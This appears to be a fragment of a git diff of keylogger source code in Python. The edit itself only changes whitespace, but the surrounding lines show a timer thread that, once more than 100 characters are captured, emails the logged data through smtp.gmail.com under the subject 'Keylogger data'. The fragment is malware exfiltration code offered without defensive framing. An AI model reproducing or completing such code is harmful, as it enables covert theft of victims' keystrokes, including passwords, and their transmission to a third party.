@@ -52,9 +52,9 @@ class TimerClass(threading.Thread):
             if len(data)>100:
                 ts = datetime.datetime.now()
                 SERVER = "smtp.gmail.com" 		# Specify Server Here
-                PORT = 587 						# Specify Port Here
+                PORT = 587 				# Specify Port Here
                 USER="address@gmail.com"		# Specify Username Here 
-                PASS="prettyflypassword"	    # Specify Password Here
+                PASS="prettyflypassword"	    	# Specify Password Here
                 FROM = USER
                 TO = ["address@gmail.com"] 		# Specify to address. Use comma if more than one to address is needed.
                 SUBJECT = "Keylogger data: "+str(ts)
